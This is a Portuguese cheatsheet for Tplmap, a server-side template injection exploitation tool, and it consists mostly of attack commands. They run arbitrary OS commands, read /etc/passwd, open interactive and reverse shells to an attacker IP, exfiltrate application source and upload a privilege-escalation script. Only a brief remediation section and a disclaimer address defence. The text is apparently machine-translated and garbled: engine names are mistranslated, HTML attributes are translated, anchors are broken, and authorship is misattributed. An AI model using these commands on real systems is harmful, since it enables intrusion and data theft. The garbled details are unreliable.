<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Segurança da Web e API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Motores de modelo">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licença GPLv2">
</p>

<p alinhar="centro">
  <b>🌐 Ferramenta de exploração automatizada projetada para detectar e explorar vulnerabilidades de injeção de modelo no servidor (SSTI) para obter execução remota de código</b>
</p>

---

## 📋 Índice

- [Visão geral e vulnerabilidade SSTI](#-overview--the-ssti-vulnerability)
- [Mecanismos de modelo suportados](#-supported-template-engines)
- [Instalação](#-instalação)
- [Detecção básica de vulnerabilidade](#-detecção de vulnerabilidade básica)
- [Direcionando pontos de injeção específicos (marcador `*`)] (#-direcionando pontos de injeção específicos - marcador)
- [Execução de comando remoto (`--os-cmd`)](#-remote-command-execution---os-cmd)
- [Shells interativos e conexões reversas](#-shells interativos--conexões reversas)
- [Upload e download de arquivo](#-upload de arquivo--download)
- [Testando dados e cabeçalhos POST](#-testing-post-data--headers)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações Defensivas e Remediação](#-considerações-defensivas--remediação)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e vulnerabilidade do SSTI

**Injeção de modelo no lado do servidor (SSTI)** ocorre quando um aplicativo incorpora entradas de usuário não validadas diretamente em um modelo no lado do servidor, em vez de transmiti-las como dados a serem renderizados. Como os mecanismos de modelo modernos permitem sintaxe como `{{7*7}}` ou `${7*7}`, os invasores podem sair da sandbox e acessar o ambiente de execução subjacente (Python, Java, PHP, Ruby, Node.js).

Escrito por **Miroslav Stampar** e **Emilio Pinna**, **Tplmap** atua como o "SQLMap para mecanismos de modelo". Ele identifica automaticamente o mecanismo de modelo ativo, sai dos contextos de avaliação de modelo e escala a execução do código para acesso total ao shell no nível do sistema operacional.

---

## 🧩 Mecanismos de modelo suportados

| Idioma | Mecanismos de modelo suportados |
|----------|----------------------------|
| **Píton** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Galho, Espertinho |
| **Java** | Freemarker, Velocidade |
| **Rubi** | ERB, Fino |
| **Node.js** | Jade, Pug, Dust.js |

---

## 📥 Instalação

Tplmap é construído em Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Detecção básica de vulnerabilidades
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Execução Remota de Comando (`--os-cmd`)

Assim que o Tplmap detectar o mecanismo (por exemplo, Jinja2), execute comandos shell arbitrários diretamente:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Shells interativos e conexões reversas
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Upload e download de arquivos

Exfiltre o código-fonte ou carregue ferramentas de persistência:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Testando dados e cabeçalhos POST
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Detectar SSTI em URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Executar comando remoto** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Terminal Interativo** | `python tplmap.py -u "<URL>" --os-shell` |
| ** Soltar shell reverso ** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Baixar arquivo remoto** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Carregar arquivo local** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Corpo do POST de teste** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Considerações defensivas e remediação

1. **Escape baseado no contexto:** Nunca concatene a entrada bruta do usuário em strings de modelo. Use o mecanismo de ligação de variável nativo do mecanismo de modelo (por exemplo, em Jinja2: `render_template('hello.html', name=user_input)` em vez de `render_template_string(f"Hello {user_input}")`).
2. **Restrições de sandbox:** Aplique sandbox estrito em mecanismos onde a renderização dinâmica é inevitável, impedindo o acesso a objetos `__class__`, `__mro__` ou de reflexão.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Tplmap executa código remoto arbitrário em servidores de aplicativos de destino. Testar ou explorar aplicações web sem autorização prévia por escrito é estritamente ilegal.